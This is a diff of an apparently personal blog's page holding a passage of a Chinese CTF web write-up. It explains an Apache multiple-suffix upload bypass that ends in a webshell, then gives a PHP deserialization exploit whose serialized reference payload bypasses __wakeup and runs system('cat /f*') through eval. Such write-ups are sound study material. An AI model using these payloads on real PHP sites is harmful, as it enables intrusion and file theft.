@@ -40,7 +40,7 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/item/67b89015d0e0a243d40171be.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/67b89695d0e0a243d40172cb.png">
 <meta property="article:published_time" content="2025-02-18T09:07:23.000Z">
-<meta property="article:modified_time" content="2025-02-21T15:48:06.247Z">
+<meta property="article:modified_time" content="2025-02-21T15:51:17.258Z">
 <meta property="article:author" content="guayu-kakeru">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="web">
@@ -150,7 +150,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">46</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">47</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -238,7 +238,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-21 23:48:06" itemprop="dateModified" datetime="2025-02-21T23:48:06+08:00">2025-02-21</time>
+                <time title="修改时间：2025-02-21 23:51:17" itemprop="dateModified" datetime="2025-02-21T23:51:17+08:00">2025-02-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -351,7 +351,7 @@
 <p>这个配置文件的意思是每个php文件在执行之前都会包含1.jpg这个文件，并且当作php执行，但是这里没有什么可以执行的php文件<br>看其他大佬的wp学习到了原来是要用apache解析漏洞<br>Apache 解析漏洞主要是因为 Apache 默认一个文件可以有多个用。分割得后缀，当最右边的后缀无法识别（mime.types 文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）<br>所以我们可以修改一个不合法的后缀，比如这个文件名改成<code>2.php.aaa</code>这样子解析的时候就会解析成php文件<br>但是还要注意用bp修改一下MIME 修改成jpg格式绕过MIME检测<br><img src="https://pic1.imgdb.cn/item/67b89695d0e0a243d40172cb.png"><br>发现成功上传    文件存储在: upload&#x2F;2.php.aaa.php<br>然后可以用蚁剑连接找到flag了</p>
 <h1 id="ez-unser"><a href="#ez-unser" class="headerlink" title="ez_unser"></a>ez_unser</h1><p>题目</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">你输入的不正确！！！搞什么！！</span><br></pre></td></tr></table></figure></div>
-<p>最终我们想执行<code>eval($this-&gt;a);</code>我们就让<code>$this -&gt; a</code>成为我们想要执行的命令<br>但是这里的wakeup会把a重新赋值，之前绕过wakeup的方法是修改序列化中的变量个数，但是这里多了限制，不让修改<br>这里利用的是<code>$this-&gt;b=$this-&gt;c</code>，php中如果两个变量同时指向一个地址也可以绕过wakeup，和SWPUCTF2022新生赛Power中的绕过方法一样<br>原理就是我们让b指向a的地址，b值修改的时候，因为公用一片内存就回让a的值也变了</p>
+<p>最终我们想执行<code>eval($this-&gt;a);</code>我们就让<code>$this -&gt; a</code>成为我们想要执行的命令<br>但是这里的wakeup会把a重新赋值，之前绕过wakeup的方法是修改序列化中的变量个数，但是这里多了限制，不让修改<br>这里利用的是<code>$this-&gt;b=$this-&gt;c</code>，php中如果两个变量同时指向一个地址也可以绕过wakeup，和ezpop中的绕过方法一样<br>原理就是我们让b指向a的地址，b值修改的时候，因为公用一片内存就回让a的值也变了</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$x</span> -&gt; b = &amp;<span class="variable">$x</span> -&gt; a;</span><br><span class="line"><span class="variable">$x</span> -&gt; c = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
 <p>然后get传入这个序列化字符串就行</p>
 
@@ -471,7 +471,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -507,6 +507,9 @@
     </div>
     <ul class="links-of-recent-posts-list">
         <li class="links-of-recent-posts-item">
+          <a href="/posts/62580.html" title="posts&#x2F;62580.html">群友靶机Flower</a>
+        </li>
+        <li class="links-of-recent-posts-item">
           <a href="/posts/41749.html" title="posts&#x2F;41749.html">HMV-Talk</a>
         </li>
         <li class="links-of-recent-posts-item">
@@ -517,9 +520,6 @@
         </li>
         <li class="links-of-recent-posts-item">
           <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
         </li>
     </ul>
   </div>
